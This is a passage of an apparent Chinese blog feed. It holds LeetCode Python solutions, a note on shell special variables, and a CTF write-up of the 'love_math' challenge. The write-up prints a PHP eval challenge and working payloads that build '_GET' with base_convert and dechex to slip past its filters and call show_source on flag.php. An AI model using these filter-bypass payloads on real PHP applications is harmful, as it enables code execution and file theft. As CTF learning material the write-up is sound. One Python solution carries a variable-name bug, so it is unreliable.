class="line">            <span class="keyword">if</span> nums[a] <span class="keyword">in</span> d:</span><br><span class="line">                <span class="keyword">return</span> d[nums[a]], a</span><br><span class="line">                </span><br><span class="line">            <span class="comment"># 否则往字典增加键/值对</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[i] = a</span><br><span class="line">        <span class="comment"># 边往字典增加键/值对，边与nums[a]进行对比</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="两数相加"><a href="#两数相加" class="headerlink" title="两数相加"></a>两数相加</h2><p>给出两个 <code>非空</code> 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 <code>逆序</code> 的方式存储的，并且它们的每个节点只能存储 <code>一位</code> 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 <strong>0</strong> 之外，这两个数都不会以 <strong>0</strong> 开头。</p>
<p><strong>示例：</strong><br>输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 0 -&gt; 8<br>原因：342 + 465 &#x3D; 807</p>
<h3 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h3><p>用时 28 ms</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addTwoNumbers</span>(<span class="params">self, l1, l2</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 一开始不做l1和l2的非空判断，因为题中已经说明是非空链表</span></span><br><span class="line">        <span class="comment"># 记录是否需要增加新节点，或者在链表的下一个节点是否需要加1，同时记录两个链表同级节点的和</span></span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 这里的执行顺序是 res = ListNode(0),pre = res</span></span><br><span class="line">        res = pre = ListNode(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 判断l1、l2、car是否有值，carry有值的话需要增加节点，或者在链表下一个节点加1</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2 <span class="keyword">or</span> carry:</span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                carry += l1.val</span><br><span class="line">                l1 = l1.<span class="built_in">next</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                carry += l2.val</span><br><span class="line">                l2 = l2.<span class="built_in">next</span></span><br><span class="line">                </span><br><span class="line">            <span class="comment"># carry 现在是同级节点的和</span></span><br><span class="line">            <span class="comment"># divmod 返回商与余数的元组，分为car和val</span></span><br><span class="line">            <span class="comment"># carry 不是0的话，需要新建节点或者在链表的下一个节点加1 ，在循环中用到</span></span><br><span class="line">            carry, val = <span class="built_in">divmod</span>(car, <span class="number">10</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 新建链表节点</span></span><br><span class="line">            <span class="comment"># 执行顺序是pre.next = ListNode(val)</span></span><br><span class="line">            <span class="comment"># pre = pre.next</span></span><br><span class="line">            pre.<span class="built_in">next</span> = pre =  ListNode(val)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#res等价于pre ,res.val = 0，所以返回res.next</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="built_in">next</span></span><br></pre></td></tr></table></figure></div>

<h2 id="待理解的地方-指针的问题，理解起来就是-res-pre-ListNode-0-的话，也就是-res-和-pre-指向了同一个链表，而分开写的话，pre-是指向了复制的和-res-相同的另一个链表。"><a href="#待理解的地方-指针的问题，理解起来就是-res-pre-ListNode-0-的话，也就是-res-和-pre-指向了同一个链表，而分开写的话，pre-是指向了复制的和-res-相同的另一个链表。" class="headerlink" title="待理解的地方 指针的问题，理解起来就是 res = pre = ListNode(0) 的话，也就是 res 和 pre 指向了同一个链表，而分开写的话，pre 是指向了复制的和 res 相同的另一个链表。
 "></a><strong>待理解的地方</strong><br><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里的执行顺序是 res = ListNode(0),pre = res</span></span><br><span class="line">        res = pre = ListNode(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><br> 指针的问题，理解起来就是 <code>res = pre = ListNode(0)</code> 的话，也就是 <code>res</code> 和 <code>pre</code> 指向了同一个链表，而分开写的话，<code>pre</code> 是指向了复制的和 <code>res</code> 相同的另一个链表。
 </h2><h3 id="大佬的解法2"><a href="#大佬的解法2" class="headerlink" title="大佬的解法2"></a>大佬的解法2</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x</span>):</span><br><span class="line">        self.val = x</span><br><span class="line">        self.<span class="built_in">next</span> = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addTwoNumbers</span>(<span class="params">self, l1, l2</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 这里一开始不做l1、l2非空判断，题意表明非空链表</span></span><br><span class="line">        <span class="comment"># 记录是否需要增加新节点，或在链表下一个节点是否需要加1，同时记录链表同级节点的和</span></span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 这里的执行顺序是res = ListNode(0), pre = res</span></span><br><span class="line">        res = pre = ListNode(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># 判断l1、l2、carry是否有值，carry有值的话需要增加新节点，或在链表下一个节点需要加1</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2 <span class="keyword">or</span> carry:</span><br><span class="line">            <span class="comment"># 判断l1是否有值</span></span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                carry += l1.val</span><br><span class="line">                l1 = l1.<span class="built_in">next</span></span><br><span class="line">            <span class="comment"># 判断l2是否有值</span></span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                carry += l2.val</span><br><span class="line">                l2 = l2.<span class="built_in">next</span></span><br><span class="line">            <span class="comment"># carry有同级节点的和</span></span><br><span class="line">            <span class="comment"># divmod返回商与余数的元组，拆包为carry和val</span></span><br><span class="line">            <span class="comment"># carry有值的话需要增加新节点，或在链表下一个节点需要加1,在循环中会用到</span></span><br><span class="line">            carry, val = <span class="built_in">divmod</span>(carry, <span class="number">10</span>)</span><br><span class="line">            <span class="comment"># 新建链表节点</span></span><br><span class="line">            <span class="comment"># 这里是n.next = ListNode(val), n = n.next()</span></span><br><span class="line">            pre .<span class="built_in">next</span> = pre  = ListNode(val)</span><br><span class="line">        <span class="comment"># res等价于pre，res.val=0，所以返回res.next</span></span><br><span class="line">        <span class="keyword">return</span> res.<span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建对象Solution</span></span><br><span class="line">    sol = Solution()</span><br><span class="line">    <span class="comment"># 定义l1链表</span></span><br><span class="line">    l1 = ListNode(<span class="number">2</span>)</span><br><span class="line">    l1.<span class="built_in">next</span> = l11 = ListNode(<span class="number">4</span>)</span><br><span class="line">    l11.<span class="built_in">next</span> = l12 = ListNode(<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># 定义l2链表</span></span><br><span class="line">    l2 = ListNode(<span class="number">5</span>)</span><br><span class="line">    l2.<span class="built_in">next</span> = l21 = ListNode(<span class="number">6</span>)</span><br><span class="line">    l21.<span class="built_in">next</span> = l22 = ListNode(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 获取返回值的链表</span></span><br><span class="line">    res = sol.addTwoNumbers(l1, l2)</span><br><span class="line">    <span class="comment"># 循环遍历出来</span></span><br><span class="line">    <span class="keyword">while</span> res:</span><br><span class="line">        <span class="built_in">print</span>(res.val)</span><br><span class="line">        res = res.<span class="built_in">next</span></span><br></pre></td></tr></table></figure></div>

<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有很多要学要看的东西，慢慢来吧，虽然没有多少时间了</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>linux shell下的特殊用法及参数的说明</title>
    <url>/yakko117/2019/07/15/linuxshell_study/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="变量说明"><a href="#变量说明" class="headerlink" title="变量说明:"></a>变量说明:</h1><h2 id><a href="#" class="headerlink" title="$$"></a>$$</h2><p>Shell 本身的PID（ProcessID）</p>
<h2 id="-1"><a href="#-1" class="headerlink" title="$!"></a>$!</h2><p>Shell 最后运行的后台Process的PID </p>
<h2 id="-2"><a href="#-2" class="headerlink" title="$?"></a>$?</h2><p>最后运行的命令的结束代码（返回值） </p>
<h2 id="-3"><a href="#-3" class="headerlink" title="$-"></a>$-</h2><p>使用Set命令设定的Flag一览 </p>
<h2 id="-4"><a href="#-4" class="headerlink" title="$*"></a>$*</h2><p>所有参数列表。如 <code>$*</code> 用<code>[&quot;]</code>括起来的情况，以 <code>&quot;$1 $2 … $n&quot;</code> 的形式输出所有参数。 </p>
<h2 id="-5"><a href="#-5" class="headerlink" title="$@"></a>$@</h2><p>所有参数列表。如 <code>$@</code> 用<code>[&quot;]</code>括起来的情况，以 <code>&quot;$1&quot;</code> <code>&quot;$2&quot;</code> … <code>&quot;$n&quot;</code> 的形式输出所有参数。</p>
<hr>
<h2 id="-6"><a href="#-6" class="headerlink" title="$#"></a><code>$#</code></h2><p>添加到Shell的参数个数 </p>
<h2 id="0"><a href="#0" class="headerlink" title="$0"></a>$0</h2><p>Shell本身的文件名 </p>
<h2 id="以及-1-n"><a href="#以及-1-n" class="headerlink" title="以及 $1 $n"></a>以及 <code>$1</code> <code>$n</code></h2><p>添加到Shell的各参数值。<code>$1</code>是第1参数，<code>$2</code>是第2参数</p>
<hr>
<h1 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h1><p>写个简单的例子，执行以后再来解释各个变量的意义</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leafpad yakko_test</span><br></pre></td></tr></table></figure></div>

<p>脚本内容如下</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span> </span><br><span class="line">echo &quot;number:$#&quot; </span><br><span class="line">echo &quot;scname:$0&quot; </span><br><span class="line">echo &quot;first :$1&quot; </span><br><span class="line">echo &quot;second:$2&quot; </span><br><span class="line">echo &quot;argume:$@&quot; </span><br></pre></td></tr></table></figure></div>

<p>保存退出，赋予权限</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod +x yakko_test</span><br><span class="line"></span><br><span class="line">// 执行脚本</span><br><span class="line">./yakko_test aa bb </span><br><span class="line"></span><br><span class="line">// 回显得到</span><br><span class="line">number:2 </span><br><span class="line">scname:./yakko_test</span><br><span class="line">first: aa </span><br><span class="line">second:bb </span><br><span class="line">argume:aa bb</span><br></pre></td></tr></table></figure></div>
<p>通过显示结果可以看到：<br><code>$#</code> 是传给脚本的参数个数<br><code>$0</code> 是脚本本身的名字<br><code>$1</code> 是传递给该shell脚本的第一个参数<br><code>$2</code> 是传递给该shell脚本的第二个参数<br><code>$@</code> 是传给脚本的所有参数的列表</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋国赛 love_math</title>
    <url>/yakko117/2019/05/16/love_math/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="Love-Math"><a href="#Love-Math" class="headerlink" title="Love_Math"></a>Love_Math</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到题目限制了参数长度要求小于80<br>并且不能包含<code>空格</code>、<code>制表符</code>、<code>换行</code>、<code>单双引号</code>、<code>反引号</code>、<code>[]</code> 。<br>并且有白名单限制输入的字符；<br>最终执行 <code>eval(&#39;echo &#39;.$content.&#39;;&#39;); </code></p>
<p>想要 <code>getshell</code>，需要能获得任意字符串。但由于单双引号都被waf了，我们无法从函数名中提取字符串。因此只能想办法从函数的返回结果中获得。</p>
<p>通过查看文档， 发现 <code>base_convent</code> 函数可以返回任意字母， 但是无法返回 <code>_ *</code> 等特殊字符</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj52nvj30pf0dydio.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj52nvj30pf0dydio.jpg" class="lazyload"></a></p>
<p>尝试将 <code>phpinfo</code> 先转换成 <code>hex</code> 形式再转换成十进制，查看结果</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj4494j30lo0d9jsi.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj4494j30lo0d9jsi.jpg" class="lazyload"></a></p>
<p>成功执行 <code>phpinfo()</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj44lqj30uz0dmt9w.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj44lqj30uz0dmt9w.jpg" class="lazyload"></a></p>
<p>执行系统命令 <code>system&#39;ls&#39;</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj3suuj30s406zglx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj3suuj30s406zglx.jpg" class="lazyload"></a></p>
<p>现在我们要想办法得到<code>flag.php</code> ，有以下方法:</p>
<ol>
<li>使用php函数 <code>readfile</code> 读取文件， 但是需要 <code>flag.php</code> 中的 <code>·</code>；</li>
<li>由于长度问题，我们无法直接在参数c里传过多的白名单函数+字符，因此需要使用 $_GET 全局变量手动传入参数 getshell，不直接使用参数c，即可绕过，但要注意的是此处的参数名，不能为字母，只能为数字，不然会被第二个关键词白名单所拦截；</li>
<li>使用system 等命令执行函数配合通配符 <code>*</code> 读取文件.</li>
</ol>
<hr>
<h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>为了缩短字符长度，我们可以将函数 <code>base_convert</code> 赋值给一个短变量名,由于白名单的限制，我们最少需要两个字符，即 <code>$pi</code> 。</p>
<p>(这里直接套用大佬的一个脚本)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ss</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;\&#x27;,&#x27;</span>_<span class="string">&#x27;,&#x27;</span>^<span class="string">&#x27;,&#x27;</span>]<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foreach ($ss as $w) &#123;</span></span><br><span class="line"><span class="string">    foreach ($ss as $r)&#123;</span></span><br><span class="line"><span class="string">        echo $w;</span></span><br><span class="line"><span class="string">        echo(&quot; and &quot;);</span></span><br><span class="line"><span class="string">        echo $r;</span></span><br><span class="line"><span class="string">        echo(&quot; &lt;=&gt; &quot;);</span></span><br><span class="line"><span class="string">        echo ($w^$r);</span></span><br><span class="line"><span class="string">        echo(&quot; &lt;=&gt; &quot;);</span></span><br><span class="line"><span class="string">        echo(ord($w^$r));</span></span><br><span class="line"><span class="string">        echo (&quot;&lt;br&gt;&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>发现无法异或出 <code>.</code> ，但是可以dechex函数可以把10进制转换为16进制，我们可以再异或出hex2bin，来获取任意ASCII字符。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj7rwgj30i20g3my1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xj7rwgj30i20g3my1.jpg" class="lazyload"></a></p>
<p>构造如下 Payload:</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$pi</span>=base_convert)(<span class="number">2146934604002</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">727432</span>,<span class="number">10</span>,<span class="number">36</span>).<span class="variable">$pi</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">46</span>)).<span class="variable">$pi</span>(<span class="number">33037</span>,<span class="number">10</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure></div>
<p>可惜超过字符长度限制了，在本地没有字符限制条件下测试 可以读取</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjc8c7j30q106f3yt.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g330xjc8c7j30q106f3yt.jpg" class="lazyload"></a></p>
<p>由于 <code>Ascii</code> 转成 <code>Hex</code> 后转回来需要 <code>hex2bin</code> 函数，而白名单里并没有这个函数<br>所以我们需要使用进制转换进行绕过，又因为 <code>hex2bin</code> 里部分字母只有在32进制后才会出现，所以此处我们选择36进制。<br>将 <code>hex2bin</code> 由36进制成无字母的10进制得到：<code>37907361743</code>我们使用 <code>base_convert（37907361743，10,36)</code> 即可转换成 <code>hex2bin</code>，而<code>_GET</code>的 <code>hex</code> 为 <code>5f474554</code>，里边包含了字母f，需要在进行一次转换：f正好为16进制里的最后一个字母，可直接使用 <code>dechex(1598506324)</code> 即可绕过。故 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure></div>

<p>即为 <code>$pi = _GET</code><br>接着构造 <code>$$pi = $_GET</code> ，可知 <code>$$pi[x]()</code> 可以自定义函数名， 但 <code>[]</code>内不能为字母，因此采用 <code>$$pi&#123;0&#125;($$pi&#123;1&#125;)</code><br>Payload 如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;0&#125;($$pi&#123;1&#125;);&amp;0=show_source&amp;1=flag.php</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138bdrfj313l05qt95.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g33138bdrfj313l05qt95.jpg" class="lazyload"></a></p>
<hr>
<h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>同样的，我们fuzz发现无法异或出 <code>*</code>，需要借助 <code>hex2bin</code> 函数。</p>
